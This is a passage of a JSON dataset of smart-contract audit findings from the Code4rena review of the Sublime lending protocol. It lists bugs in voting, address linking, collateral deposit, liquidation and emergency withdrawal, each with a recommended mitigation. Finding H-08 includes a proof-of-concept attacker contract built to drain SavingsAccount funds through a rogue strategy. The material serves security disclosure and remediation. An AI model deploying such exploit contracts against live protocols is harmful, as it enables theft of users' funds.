      "content": "_Submitted by cmichel_\n\nThe `Extension` contract correctly reduces votes from the `from` address of a transfer and adds it to the `to` address of the transfer (in case both of them voted on it before), but it does not rerun the voting logic in `voteOnExtension` that actually grants the extension.\nThis leads to issues where an extension should be granted but is not:\n\n###### POC\n\n*   `to` address has 100 tokens and votes for the extension\n*   `from` address has 100 tokens but does not vote for the extension and transfers the 100 tokens to `to`\n*   `to` now has 200 tokens, `removeVotes` is run, the `totalExtensionSupport` is increased by 100 to 200. In theory, the threshold is reached and the vote should pass if `to` could call `voteOnExtension` again.\n*   But their call to `voteOnExtension` with the new balance will fail as they already voted on it (`lastVotedExtension == _extensionVoteEndTime`). The extension is not granted.\n\n#### Impact\n\nExtensions that should be granted after a token transfer are not granted.\n\n#### Recommended Mitigation Steps\n\nRerun the threshold logic in `removeVotes` as it has the potential to increase the total support if `to` voted for the extension but `from` did not.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/141)**\n\n\n",
      "summary": "\nThis bug report is about an issue in the `Extension` contract of a system. The issue is that when tokens are transferred from one address to another, the voting logic in `voteOnExtension` does not rerun, even though the total support of the extension should increase. This means that extensions that should be granted after a token transfer are not granted.\n\nThe bug can be replicated by having the `to` address have 100 tokens and voting for the extension, and the `from` address have 100 tokens but not voting for the extension and transferring the 100 tokens to `to`. In theory, the threshold should be reached and the vote should pass if `to` could call `voteOnExtension` again. However, their call to `voteOnExtension` with the new balance will fail as they already voted on it, and the extension is not granted.\n\nThe recommended mitigation step for this issue is to rerun the threshold logic in `removeVotes` as it has the potential to increase the total support if `to` voted for the extension but `from` did not.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/141",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1198",
      "title": "[M-04] Unlinked address can link immediately again",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nAfter a master calls unlinkAddress() to unlink an address, the address that has just been unlinked can directly link again without permission.\nThe address that is just unlinked can call linkAddress(masterAddress) which will execute because pendingLinkAddresses is still set.\nAssuming the master has unlinked for a good reason it is unwanted to be able to be linked again without any permission from the master.\n\nNote: a master can prevent this by calling cancelAddressLinkingRequest(), but this doesn't seem logical to do\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Verification/Verification.sol#L129-L154>\n\n```solidity\n    function unlinkAddress(address _linkedAddress) external {\n        address _linkedTo = linkedAddresses[_linkedAddress].masterAddress;\n        require(_linkedTo != address(0), 'V:UA-Address not linked');\n        require(_linkedTo == msg.sender, 'V:UA-Not linked to sender');\n        delete linkedAddresses[_linkedAddress]; \n       ...\n}\n    function linkAddress(address _masterAddress) external {\n        require(linkedAddresses[msg.sender].masterAddress == address(0), 'V:LA-Address already linked');   // == true (after unlinkAddress)\n        require(pendingLinkAddresses[msg.sender][_masterAddress], 'V:LA-No pending request');                 // == true (after unlinkAddress)\n        _linkAddress(msg.sender, _masterAddress);                                                                                           // // pendingLinkAddresses not reset\n    }\n\nfunction cancelAddressLinkingRequest(address _linkedAddress) external {\n        ... \n        delete pendingLinkAddresses[_linkedAddress][msg.sender]; // only location where pendingLinkAddresses is reset\n```\n\n#### Recommended Mitigation Steps\n\nAdd something like to following at the end of linkAddress:\n\n```solidity\ndelete pendingLinkAddresses[msg.sender][_masterAddress]; \n```\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/54)**\n\n",
      "summary": "\nThis bug report details a vulnerability in the Verification smart contract. After a master calls unlinkAddress() to unlink an address, the address that has just been unlinked can directly link again without permission. This can be exploited by an attacker to gain access to the contract without permission from the master. \n\nThe proof of concept provided in the report shows that this is possible because of the fact that pendingLinkAddresses is not reset after the unlinkAddress() function is called. It is recommended that the linkAddress() function should be modified to include a line of code which deletes pendingLinkAddresses[msg.sender][_masterAddress] to prevent this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/54",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "1197",
      "title": "[M-03] Collateral can be deposited in a finished pool",
      "impact": "MEDIUM",
      "content": "_Submitted by pedroais_\n\n#### Proof of Concept\n\nThe depositCollateral function doesn't check the status of the pool so collateral can be deposited in a finished loan. This can happen by mistake and all funds will be lost.\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207>\n\n#### Recommended Mitigation Steps\n\nRequire loan status to be collection or active in the depositCollateral function.\n\n**[ritik99 (Sublime) disagreed with severity](https://github.com/code-423n4/2021-12-sublime-findings/issues/169#issuecomment-1001019540):**\n > We will add a check for this. The issue however stems from user error. Sending assets to an address without proper checks does not constitute an attack path imo. We would suggest a rating of (1) Low or (0) non-critical given the low likelihood and the impact of the attack (only the user making the incorrect transaction is affected)\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/169#issuecomment-1018679575):**\n > `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> This definitely qualifies as \"external requirements\" and a simple check would assist in avoid it.\n\n\n",
      "summary": "\nThis bug report describes an issue with the depositCollateral function in the Pool contract. The function does not check the status of the loan before allowing collateral to be deposited, meaning that collateral can be deposited in a finished loan and all funds will be lost. The recommended mitigation step is to require loan status to be collection or active in the depositCollateral function. This will ensure that collateral can only be deposited in active loans, preventing users from losing funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/169",
      "tags": [],
      "finders": [
        "pedroais"
      ]
    },
    {
      "id": "1196",
      "title": "[M-02] CreditLine.liquidate doesn't transfer borrowed ETH to a lender",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by 0x0x0x_\n\n#### Impact\n\nFunds that are acquired from a liquidator and should be sent to a lender are left with the contract instead. The funds aren't lost, but after the fact mitigation will require manual accounting and fund transfer for each CreditLine.liquidate usage.\n\n#### Proof of Concept\n\nETH sent to CreditLine.liquidate by an external liquidator when `autoLiquidation` is enabled remain with the contract and aren't transferred to the lender:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/CreditLine/CreditLine.sol#L1015>\n\n#### Recommended Mitigation Steps\n\nAdd transfer to a lender for ETH case:\n\nNow:\n```solidity\n\nif (_borrowAsset == address(0)) {\n        uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');\n        if (_returnETH != 0) {\n                (bool success, ) = msg.sender.call{value: _returnETH}('');\n                require(success, 'Transfer fail');\n        }\n}\n```\nTo be:\n```solidity\n\nif (_borrowAsset == address(0)) {\n        uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');\n        \n        (bool success, ) = _lender.call{value: _borrowTokens}('');\n        require(success, 'liquidate: Transfer failed');\n        \n        if (_returnETH != 0) {\n                (success, ) = msg.sender.call{value: _returnETH}('');\n                require(success, 'liquidate: Return transfer failed');\n        }\n}\n```\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/90)**\n\n\n",
      "summary": "\nThis bug report concerns the CreditLine.liquidate function on the Ethereum blockchain. Funds that should be sent to a lender are left with the contract instead. This means that manual accounting and fund transfer for each CreditLine.liquidate usage will be required for after-the-fact mitigation. The recommended mitigation step is to add a transfer to the lender for ETH cases. The code should be changed from what is currently written to the code provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/90",
      "tags": [],
      "finders": [
        "hyh",
        "0x0x0x"
      ]
    },
    {
      "id": "1195",
      "title": "[M-01] Ether can be locked in the `PoolFactory` contract without a way to retrieve it",
      "impact": "MEDIUM",
      "content": "_Submitted by broccolirob_\n\nIf a borrower calls the `createPool` function with a non-zero value, but also includes an ERC20 token address for `_collateralToken`, then the Ether value sent will be locked in the `PoolFactory` contract forever.\n\n*   [createPool L260-317](https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/PoolFactory.sol#L260-L317)\n\nIn the `_createPool` function, a `_collateralToken` address other than the zero address will set the `amount` variable to zero. That `amount` variable will be passed to `create2` which will send 0 wei to the newly created `Pool` contract.\n\n```solidity\n// _createPool L349\nuint256 amount = _collateralToken == address(0) ? _collateralAmount : 0;\n```\n\n#### Impact\n\nA borrower can accidentally lock Ether in the `PoolFactory` without the ability to retrieve it.\n\n#### Proof of Concept\n\nA borrower reuses a script they made to create a pool and deposit collateral. They intend to deposit Ether as collateral so they send value with the transaction, but forget to change the `_collateralToken` address to address(0). The `Pool` contract will be deployed using the `_collateralToken`, and will lock the Ether sent in the `PoolFactory`\n\n#### Tools Used\n\nManual analysis and Hardhat.\n\n#### Recommended Mitigation Steps\n\nIf msg.value is greater than 0, make sure the `_collateralToken` address is set to address(0).\n\n\n**[ritik99 (Sublime) disputed and disagreed with severity](https://github.com/code-423n4/2021-12-sublime-findings/issues/168#issuecomment-1001018859):**\n > We will add this check but the scenario laid out is more about sanity checks on the side of the end-user. Assets are not stolen or compromised directly but because of user error. Such cases are better handled via UI/UX. We would suggest a (1) Low rating given the likelihood\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/168#issuecomment-1018049928):**\n > Marking down to medium risk based on the c4 documentation and some external requirements on how this would have to occur. \n> \n> `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n",
      "summary": "\nThis bug report is about an issue that occurs in the `PoolFactory` contract of the 2021-12-sublime project. If a borrower calls the `createPool` function with a non-zero value, but also includes an ERC20 token address for `_collateralToken`, then the Ether value sent will be locked in the `PoolFactory` contract forever. This is due to the `_createPool` function setting the `amount` variable to zero when a `_collateralToken` address other than the zero address is used. \n\nThe impact of this bug is that a borrower can accidentally lock Ether in the `PoolFactory` without the ability to retrieve it. The bug was discovered through manual analysis and Hardhat tools.\n\nThe recommended mitigation step for this issue is to make sure that if msg.value is greater than 0, the `_collateralToken` address is set to address(0).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/168",
      "tags": [],
      "finders": [
        "broccolirob"
      ]
    },
    {
      "id": "1194",
      "title": "[H-11] Unable To Call `emergencyWithdraw` ETH in `NoYield` Contract",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `emergencyWithdraw` function is implemented in all yield sources to allow the `onlyOwner` role to drain the contract's balance in case of emergency. The contract considers ETH as a zero address asset. However, there is a call made on `_asset` which will revert if it is the zero address. As a result, ETH tokens can never be withdrawn from the `NoYield` contract in the event of an emergency.\n\n#### Proof of Concept\n\nConsider the case where `_asset == address(0)`. An external call is made to check the contract's token balance for the target `_asset`. However, this call will revert as `_asset` is the zero address. As a result, the `onlyOwner` role will never be able to withdraw ETH tokens during an emergency.\n```solidity\nfunction emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {\n    require(_wallet != address(0), 'cant burn');\n    uint256 amount = IERC20(_asset).balanceOf(address(this));\n    IERC20(_asset).safeTransfer(_wallet, received);\n    received = amount;\n}\n```\nAffected function as per below:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/yield/NoYield.sol#L78-L83>\n\n#### Recommended Mitigation Steps\n\nConsider handling the case where `_asset` is the zero address, i.e. the asset to be withdrawn under emergency is the ETH token.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/52)**\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/52#issuecomment-1018680972):**\n > Upgrading to Sev 3 in line with #4  / #115 as this results in funds being stuck in the contract. \n\n\n\n \n",
      "summary": "\nThe bug report is about a vulnerability in the `emergencyWithdraw` function of the `NoYield` contract, which is implemented in all yield sources. The function allows the `onlyOwner` role to drain the contract's balance in case of emergency, however, the contract considers ETH as a zero address asset and a call is made on `_asset` which will revert if it is the zero address. As a result, the `onlyOwner` role will never be able to withdraw ETH tokens during an emergency. The vulnerability was identified through manual code review. The recommended mitigation steps include handling the case where `_asset` is the zero address, i.e. the asset to be withdrawn under emergency is the ETH token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/52",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1193",
      "title": "[H-10] Wrong implementation of `NoYield.sol#emergencyWithdraw()`",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by 0x1f8b_\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L78-L83>\n\n```solidity\nfunction emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {\n    require(_wallet != address(0), 'cant burn');\n    uint256 amount = IERC20(_asset).balanceOf(address(this));\n    IERC20(_asset).safeTransfer(_wallet, received);\n    received = amount;\n}\n```\n\n`received` is not being assigned prior to L81, therefore, at L81, `received` is `0`.\n\nAs a result, the `emergencyWithdraw()` does not work, in essence.\n\n##### Recommendation\n\nChange to:\n\n```solidity\nfunction emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {\n    require(_wallet != address(0), 'cant burn');\n    received = IERC20(_asset).balanceOf(address(this));\n    IERC20(_asset).safeTransfer(_wallet, received);\n}\n```\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/115)** \n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/115#issuecomment-1018669684):**\n > upgrading to High  sev based on assets being \"lost\" directly.  IE the emergency function will not work.\n> \n> `\n> 3 â€” High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n",
      "summary": "\nThe bug report describes an issue with the `emergencyWithdraw()` function in the code repository of WatchPug. The function is not working as intended, because the variable `received` is not assigned prior to line 81. As a result, at line 81, `received` is `0`. The recommendation is to change the code to the one provided, which assigns `received` before using it. This should fix the issue and make the function work as intended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/115",
      "tags": [],
      "finders": [
        "WatchPug",
        "0x1f8b"
      ]
    },
    {
      "id": "1192",
      "title": "[H-09] `PriceOracle` Does Not Filter Price Feed Outliers",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nIf for whatever reason the Chainlink oracle returns a malformed price due to oracle manipulation or a malfunctioned price, the result will be passed onto users, causing unintended consequences as a result.\n\nIn the same time it's possible to construct mitigation mechanics for such cases, so user economics be affected by sustainable price movements only. As price outrages provide a substantial attack surface for the project it's worth adding some complexity to the implementation.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/PriceOracle.sol#L149-L161>\n```solidity\nfunction getLatestPrice(address num, address den) external view override returns (uint256, uint256) {\n    uint256 _price;\n    uint256 _decimals;\n    (_price, _decimals) = getChainlinkLatestPrice(num, den);\n    if (_decimals != 0) {\n        return (_price, _decimals);\n    }\n    (_price, _decimals) = getUniswapLatestPrice(num, den);\n    if (_decimals != 0) {\n        return (_price, _decimals);\n    }\n    revert(\"PriceOracle::getLatestPrice - Price Feed doesn't exist\");\n}\n```\nThe above code outlines how prices are utilised regardless of their actual value (assuming it is always a non-zero value).\n\n#### Recommended Mitigation Steps\n\nConsider querying both the Chainlink oracle and Uniswap pool for latest prices, ensuring that these two values are within some upper/lower bounds of each other. It may also be useful to track historic values and ensure that there are no sharp changes in price. However, the first option provides a level of simplicity as UniswapV3's TWAP implementation is incredibly resistant to flash loan attacks. Hence, the main issue to address is a malfunctioning Chainlink oracle.\n\n**[ritik99 (Sublime) disputed](https://github.com/code-423n4/2021-12-sublime-findings/issues/51#issuecomment-1007996594):**\n > The described suggestion is fairly complex - besides the increase in code complexity, we'd also have to decide the bounds within which the Uniswap and Chainlink oracles should report prices that won't be trivial. We've also noted in the [assumptions](https://github.com/code-423n4/2021-12-sublime#assumptions--design-choices) section of our contest repo that oracles are assumed to be accurate\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/51#issuecomment-1018064762):**\n > \" We expect these feeds to be fairly reliable.\" - Based on this quote, I am going to leave this open at the current risk level.  These are valid changes that could significantly reduce the risk of the implementation and unintended liquidations. \n> \n> Fairly reliable != 100% reliable\n> \n\n\n",
      "summary": "\nThis bug report concerns the Chainlink oracle, which is used to retrieve prices for users. If the oracle returns a malformed or malfunctioned price, this could cause unintended consequences for users. The proof of concept provided is a snippet of code which outlines how prices are utilised regardless of their actual value. To mitigate this issue, the report recommends querying both the Chainlink oracle and Uniswap pool for latest prices, ensuring that these two values are within some upper/lower bounds of each other. Additionally, tracking historic values and ensuring there are no sharp changes in price may also be useful. The main issue to address is a malfunctioning Chainlink oracle.",
      "quality_score": 3,
      "rarity_score": 4.5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/51",
      "tags": [
        "Oracle",
        "TWAP"
      ],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1191",
      "title": "[H-08] Possibility to drain SavingsAccount contract assets",
      "impact": "HIGH",
      "content": "_Submitted by kemmio_\n\n#### Impact\n\nA malicious actor can manipulate switchStrategy() function in a way to withdraw tokens that are locked in SavingsAccount contract\n(the risk severity should be reviewed)\n\n#### Proof of Concept\n\nFirstly an attacker need to deploy a rogue strategy contract implementing IYield.getSharesForTokens() and IYield.unlockTokens() functions\nand calling switchStrategy() with \\_currentStrategy = ROGUE_CONTRACT_ADDRESS (\\_newStrategy can be any valid strategy e.g. NoYield)\n\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L160>\n```solidity\nrequire(_amount != 0, 'SavingsAccount::switchStrategy Amount must be greater than zero');\n```\nBypass this check by setting \\_amount > 0, since it will be overwritten in line\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L162>\n```solidity\n_amount = IYield(_currentStrategy).getSharesForTokens(_amount, _token);\n```\ngetSharesForTokens() should be implemented to always return 0, hence to bypass the overflow in lines\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L164-L167>\n```solidity\nbalanceInShares[msg.sender][_token][_currentStrategy] = balanceInShares[msg.sender][_token][_currentStrategy].sub(\n_amount,\n'SavingsAccount::switchStrategy Insufficient balance'\n);\n```\nsince balanceInShares\\[msg.sender]\\[\\_token]\\[\\_currentStrategy] == 0 and 0-0 will not overflow\n\nThe actual amount to be locked is saved in line\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L169>\n```solidity\nuint256 _tokensReceived = IYield(_currentStrategy).unlockTokens(_token, _amount);\n```\nthe rouge unlockTokens() can check asset balance of the contract and return the full amount\n\nAfter that some adjustment are made to set approval for the token or to handle native assets case\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L171-L177>\n```solidity\nuint256 _ethValue;\nif (_token != address(0)) {\n    IERC20(_token).safeApprove(_newStrategy, _tokensReceived);\n} else {\n    _ethValue = _tokensReceived;\n}\n_amount = _tokensReceived;\n```\nFinally the assets are locked in the locked strategy and shares are allocated on attackers acount\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L179-L181>\n```solidity\n\nuint256 _sharesReceived = IYield(_newStrategy).lockTokens{value: _ethValue}(address(this), _token, _tokensReceived);\n\nbalanceInShares[msg.sender][_token][_newStrategy] = balanceInShares[msg.sender][_token][_newStrategy].add(_sharesReceived);\n```\n\nProof of Concept\n\n```solidity\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract Attacker{\n    function getSharesForTokens(uint256 amount, address token) external payable  returns(uint256){\n        return 0;\n    }\n    function unlockTokens(address token, uint256 amount) external payable returns(uint256){\n        uint256 bal;\n        if(token == address(0))\n            bal = msg.sender.balance;\n        else\n            bal = IERC20(token).balanceOf(msg.sender);\n        return bal;\n    }\n}\n```\n#### Recommended Mitigation Steps\n\nAdd a check for \\_currentStrategy to be from strategy list like the one in line\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L159>\n\n    require(IStrategyRegistry(strategyRegistry).registry(_newStrategy), 'SavingsAccount::_newStrategy do not exist');\n\n**[ritik99 (Sublime) disputed](https://github.com/code-423n4/2021-12-sublime-findings/issues/41#issuecomment-1001380202):**\n > The savings account contract doesn't hold any tokens, so it is not possible to lock tokens in a new strategy, hence this attack will not work. Nevertheless it is something we will explore further to limit unexpected state changes\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/41#issuecomment-1018063038):**\n > Based on the review of the warden I believe this is a valid attack path.  This line would need to change to the amount of tokens that are to be \"stolen\" but otherwise this does seem accurate. \n> \n```solidity\nbal = IERC20(token).balanceOf(msg.sender);\n```\n\n\n\n",
      "summary": "\nA bug has been discovered in the SavingsAccount contract, where a malicious actor can manipulate the switchStrategy() function to withdraw tokens that are locked in the contract. The bug is caused by the attacker deploying a rogue strategy contract implementing IYield.getSharesForTokens() and IYield.unlockTokens() functions and calling switchStrategy() with _currentStrategy set to the address of the rogue contract. By setting _amount > 0, the check in line 160 is bypassed, and the attacker can then use the rogue unlockTokens() function to check the asset balance of the contract and return the full amount. The assets are then locked in the new strategy and shares are allocated on the attacker's account.\n\nThe recommended mitigation steps to prevent this bug from occurring is to add a check for _currentStrategy to be from a strategy list, like the one in line 159. This will ensure that the rogue contract is not used in the switchStrategy() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/41",
      "tags": [],
      "finders": [
        "kemmio"
      ]
    },
    {
      "id": "1190",
      "title": "[H-07] SavingsAccount withdrawAll and switchStrategy can freeze user funds by ignoring possible strategy liquidity issues",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by cmichel_\n\n### Impact\n\nFull withdrawal and moving funds between strategies can lead to wrong accounting if the corresponding market has tight liquidity, which can be the case at least for `AaveYield`. That is, as the whole amount is required to be moved at once from Aave, both `withdrawAll` and `switchStrategy` will incorrectly account for partial withdrawal as if it was full whenever the corresponding underlying yield pool had liquidity issues.\n\n`withdrawAll` will delete user entry, locking the user funds in the strategy: user will get partial withdrawal and have the corresponding accounting entry removed, while the remaining actual funds will be frozen within the system.\n\n`switchStrategy` will subtract full number of shares for the `_amount` requested from the old strategy, while adding lesser partial number of shares for `_tokensReceived` to the new one with the same effect of freezing user's funds within the system.\n\n#### Proof of Concept\n\nSavingsAccount.withdrawAll\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L286>\n\nSavingsAccount.switchStrategy:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L152>\n\nWhen full withdrawal or strategy switch is performed it is one withdraw via `unlockTokens` without checking the amount received.\n\nIn the same time the withdraw can fail for example for the strategy switch if old strategy is having liquidity issues at the moment, i.e. Aave market is currently have utilization rate too high to withdraw the amount requested given current size of the lending pool.\n\nAave `unlockTokens` return is correctly not matched with amount requested:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/yield/AaveYield.sol#L217>\n\nBut, for example, `withdrawAll` ignores the fact that some funds can remain in the strategy and deletes the use entry after one withdraw attempt:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L294>\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L312>\n\n`switchStrategy` removes the old entry completely:\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L181>\n\n#### Recommended Mitigation Steps\n\nFor both `withdrawAll` and `switchStrategy` the immediate fix is to account for tokens received in both cases, which are `_amount` after `unlockTokens` for `withdrawAll` and `_tokensReceived` for `switchStrategy`.\n\nMore general handling of the liquidity issues ideally to be addressed architecturally, given the potential issues with liquidity availability any strategy withdrawals can be done as follows:\n\n1.  Withdraw what is possible on demand, leave the amount due as is, i.e. do not commit to completing the action in one go and notify the user the action was partial (return actual amount)\n2.  Save to query and repeat for the remainder funds on the next similar action (this can be separate flag triggered mode)\n\n**[ritik99 (Sublime) disagreed with severity](https://github.com/code-423n4/2021-12-sublime-findings/issues/80#issuecomment-1000184590):**\n > The above issue requires making a few assumptions - (i) the underlying yield protocol does not have sufficient reserves to facilitate the withdrawal of a single user, (ii) the user attempts to withdraw all their assets during such times of insufficient reserves.\n> \n> We agree that the above could be a possibility, but would be unlikely. The underlying yield protocols undergo an interest rate spike during high utilization ratios to bring reserves back to normal levels, and some revert if they cannot withdraw the necessary amount (for eg, [Compound](https://github.com/compound-finance/compound-protocol/blob/4a8648ec0364d24c4ecfc7d6cae254f55030d65f/contracts/CToken.sol#L679)). During live deployment, only those strategies that work expectedly would be onboarded, while others wouldn't (for eg, Aave as a strategy wouldn't be integrated until their [wrappers for aTokens](https://github.com/aave/protocol-v2/blob/feat-atoken-wrapper-liquidity-mining/contracts/protocol/tokenization/StaticATokenLM.sol) are ready for use). Hence we suggest reducing severity to (2) medium-risk\n> \n> also similar to #144 \n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/80#issuecomment-1018054859):**\n > While I understand the argument regarding this being an unlikely scenario, I don't believe that is a sufficient reason to downgrade the issue give the impact to a user and the lost funds.  \n> \n> `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> In this scenario - Assets are at a direct risk. \n\n\n",
      "summary": "\nThis bug report is about an issue that can occur when performing full withdrawal and moving funds between strategies on the SavingsAccount contract. If the corresponding market has tight liquidity, the whole amount is required to be moved at once from Aave, but both `withdrawAll` and `switchStrategy` will incorrectly account for partial withdrawal as if it was full. This can lead to wrong accounting and the user's funds will be frozen within the system.\n\nProof of concept is provided in the report, as well as recommended mitigation steps. The immediate fix is to account for tokens received in both cases, which are `_amount` after `unlockTokens` for `withdrawAll` and `_tokensReceived` for `switchStrategy`. More general handling of the liquidity issues should be addressed architecturally, such as withdrawing what is possible on demand, leaving the amount due as is, notifying the user the action was partial, and saving to query and repeat for the remainder funds on the next similar action.",
      "quality_score": 2,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/80",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "cmichel",
        "hyh"
      ]
    },
    {
      "id": "1189",
      "title": "[H-06] Anyone can liquidate credit line when autoLiquidation is false without supplying borrow tokens",
      "impact": "HIGH",
      "content": "_Submitted by harleythedog_\n\n#### Impact\n\nIt is intended that if a credit line has autoLiquidation as false, then only the lender can be the liquidator (see docs here: <https://docs.sublime.finance/sublime-docs/smart-contracts/creditlines>). However, this is not correctly implemented, and anyone can liquidate a position that has autoLiquidation set to false.\n\nEven worse, when autoLiquidation is set to false, the liquidator does not have to supply the initial amount of borrow tokens (determined by `_borrowTokensToLiquidate`) that normally have to be transferred when autoLiquidation is true. This means that the liquidator will be sent all of the collateral that is supposed to be sent to the lender, so this represents a huge loss to the lender. Since the lender will lose all of the collateral that they are owed, this is a high severity issue.\n\n#### Proof of Concept\n\nThe current implementation of liquidate is here: <https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L996>.\n\nNotice that the autoLiquidation value is only used in one place within this function, which is in this segment of the code:\n```solidity\n...\n    if (creditLineConstants[_id].autoLiquidation && _lender != msg.sender) {\n        uint256 _borrowTokens = _borrowTokensToLiquidate(_borrowAsset, _collateralAsset, _totalCollateralTokens);\n        if (_borrowAsset == address(0)) {\n            uint256 _returnETH = 